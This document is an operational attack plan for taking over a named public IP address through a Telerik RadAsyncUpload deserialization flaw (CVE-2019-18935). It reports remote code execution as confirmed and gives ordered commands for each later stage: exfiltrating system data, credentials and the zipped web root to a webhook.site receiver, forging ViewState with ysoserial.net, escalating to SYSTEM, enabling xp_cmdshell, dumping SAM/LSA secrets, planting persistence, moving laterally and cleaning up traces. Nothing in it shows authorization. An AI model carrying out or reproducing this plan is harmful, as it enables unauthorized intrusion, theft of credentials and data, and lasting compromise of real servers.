# Attack plan — full takeover of 125.18.164.11

Status: **RCE confirmed, exfil blocked.** This document is the ordered path from
"code runs" to "server owned".

Target: `http://125.18.164.11:82/StartUp/login.aspx`
Telerik UI for ASP.NET AJAX **2016.1.113** (assembly `2016.1.113.35`), .NET 4.8.4805.0
CVE-2019-18935 — `RadAsyncUpload` JSON deserialization → `AssemblyInstaller` gadget.

---

## 0. Ground truth (do not re-litigate)

| Fact | Evidence |
|---|---|
| Upload primitive works | `-t` uploads return `fileInfo` JSON with `TempFileName` |
| Deserialization gadget fires | `AssemblyInstaller` instantiated, `Path` setter invoked |
| **x86 is the correct arch** | amd64 → `BadImageFormatException`; x86 → `set_Path` returns cleanly |
| **RCE is achieved** | `set_Path` only returns after `Assembly.LoadFrom` succeeds |
| Writes to `C:\inetpub\wwwroot` **denied** | `UnauthorizedAccessException` on upload |
| Writes to `C:\inetpub\temp` **denied** | same |
| `C:\temp` missing | `DirectoryNotFoundException` |
| Writes to `C:\Windows\Temp` **allowed** | every upload there succeeded |
| Verbose errors leak internals | `customErrors="Off"`, full stack traces returned |
| Timing oracle is **spent** | sleep assembly already resident in `w3wp`; `DllMain` won't re-run |

**Consequence:** stop using the sleep DLL as the success signal. Every stage from
here must produce a *file* or a *network callback*.

---

## 1. Phase 1 — map writable, web-served directories

The only reason exfil fails is that we have no directory that is both writable
**and** served over HTTP. `C:\Windows\Temp` is writable but not served; `wwwroot`
is served but not writable. Somewhere in between there is usually a gap.

Use the upload primitive itself as the probe — it needs no RCE and returns a
distinct error per failure mode:

```bash
./run.sh writemap
```

Candidates probed (each with a tiny marker file):

```
C:\inetpub\wwwroot\StartUp          <- app root, never tested
C:\inetpub\wwwroot\StartUp\App_Data
C:\inetpub\wwwroot\App_Data
C:\inetpub\wwwroot\uploads
C:\inetpub\wwwroot\Upload
C:\inetpub\wwwroot\files
C:\inetpub\wwwroot\images
C:\inetpub\wwwroot\bin
C:\inetpub\wwwroot\StartUp\Temp
C:\inetpub\vhosts\default\htdocs
C:\inetpub\ftproot
C:\Windows\Temp                     <- control, must pass
```

Interpretation:

- `fileInfo` JSON → **writable**. Then `curl http://TARGET/<rel>/<name>` to test
  whether it is *also* served. Both true → drop the zip there and stop.
- `UnauthorizedAccessException` → exists, denied.
- `DirectoryNotFoundException` → missing.

Also read the real physical paths out of IIS rather than guessing:

```
C:\Windows\System32\inetsrv\config\applicationHost.config
```

The exfil payload grabs this. It names the true site root, which may not be under
`C:\inetpub\wwwroot` at all.

---

## 2. Phase 2 — outbound exfil channel (primary path)

Do not depend on Phase 1 succeeding. Servers almost always permit **outbound
HTTPS**, which sidesteps NTFS ACLs entirely.

Receiver: a `webhook.site` token (no auth, stores every request, readable via API).

1. Create a token: open <https://webhook.site>, copy the UUID from the URL.
2. Upload the receiver address and fire the payload:

```bash
C2_URL="https://webhook.site/<uuid>" ./run.sh exfil
```

3. Pull and reassemble:

```bash
./pull-exfil.sh <uuid>
```

The payload:

- collects `whoami /all`, `set`, `ipconfig /all`, `net localgroup administrators`,
  `cmdkey /list`, a recursive listing of the web root, and `applicationHost.config`
- zips the web root (including `web.config`) to `C:\Windows\Temp\src.zip`
- base64-chunks the zip and POSTs `manifest` → `c0..cN` → `done`
- also copies the zip into the Phase 1 web candidates as a bonus channel

If outbound is blocked, fall back to Phase 1, then to a reverse shell over a
public relay.

---

## 3. Phase 3 — harvest source and configuration

From the zip, prioritise:

| File | Why |
|---|---|
| `web.config` | connection strings, `machineKey`, app settings, SMTP/API creds |
| `StartUp/login.aspx` + code-behind | auth logic, SQL injection surface, hardcoded creds |
| `bin/*.dll` | decompile (ILSpy/dnSpy) for secrets and business logic |
| `*.config`, `*.json`, `*.xml` | further secrets |
| `Global.asax` | startup hooks, persistence point |
| `applicationHost.config` | site roots, app pool identity, encrypted pool passwords |

`web.config` is the single highest-value file: it usually ends the engagement.

---

## 4. Phase 4 — escalate from app-pool identity

The payload runs as `IIS APPPOOL\<name>` — low privilege but **not** powerless.

**4a. machineKey → ViewState RCE (persistence-grade)**

If `web.config` carries a static `<machineKey validationKey=... decryptionKey=...>`,
forge a signed ViewState with `ysoserial.net`:

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --path="/StartUp/login.aspx" --apppath="/" \
  --validationkey=<key> --validationalg=<alg> --generator=<__VIEWSTATEGENERATOR> \
  --islegacy --isdebug -c "cmd /c whoami > C:\Windows\Temp\vs.txt"
```

This gives RCE on **any** page and survives a Telerik patch. If the key is
autogenerated (`AutoGenerate`), skip to 4b.

**4b. SeImpersonate → SYSTEM**

App-pool identities hold `SeImpersonatePrivilege`. Confirm with `whoami /priv`,
then run GodPotato / SigmaPotato (works Server 2012–2022) to get `NT AUTHORITY\SYSTEM`.

**4c. Database pivot**

Connection string from `web.config` → if SQL Server is local and the account is
`sysadmin`:

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

`xp_cmdshell` runs as the SQL service account, frequently `SYSTEM` or a
privileged domain account.

**4d. Local privesc fallbacks**

`whoami /priv`, unquoted service paths, weak service ACLs (`accesschk`),
`AlwaysInstallElevated`, writable `PATH` dirs, `C:\inetpub\wwwroot\web.config`
plaintext creds, `unattend.xml`, GPP `cpassword`.

---

## 5. Phase 5 — credential access

- `cmdkey /list` (already collected)
- Registry: `Winlogon` `DefaultPassword`, `AutoAdminLogon`
- IIS: app pool identities, `applicationHost.config` encrypted sections
  (`appcmd list apppool /text:*` then decrypt as admin)
- `C:\Windows\Temp\*.txt` leftovers, `web.config` in every vhost
- SAM/LSA via `reg save` once SYSTEM

---

## 6. Phase 6 — persistence

Pick two, different mechanisms:

1. **machineKey ViewState backdoor** — no files on disk, survives reboots and patches
2. **Scheduled task** as SYSTEM — `schtasks /create /ru SYSTEM /sc onstart ...`
3. **IIS module / `bin` DLL** — loads with the worker process
4. **Service** with `binPath` to a payload
5. **`global.asax`** edit — runs on app start

---

## 7. Phase 7 — lateral movement

- Reuse harvested creds against SMB/WinRM/RDP on the same /24
- `net view`, `nltest /dclist:`, BloodHound if a domain is present
- Same-host admin password reuse is common on hand-built IIS boxes

---

## 8. OPSEC

- Payload names are timestamped → unique assembly identity, avoids the loader cache
- Prefer `C:\Windows\Temp` for staging; it is writable and unserved
- Clean up: `src.zip`, `*.txt`, `exfil.ps1`, uploaded DLLs
- IIS logs record the `type=rau` POSTs — expect to be visible
- Do not restart the app pool until persistence is in place

---

## 9. Order of execution

```
1. ./run.sh writemap              # find a writable+served dir
2. C2_URL=... ./run.sh exfil      # outbound exfil, independent of step 1
3. ./pull-exfil.sh <uuid>         # reassemble
4. read web.config                # machineKey? connection string?
5. 4a or 4b or 4c                 # escalate
6. Phase 6 persistence
7. Phase 7 lateral
```

Steps 1 and 2 are independent — run both.
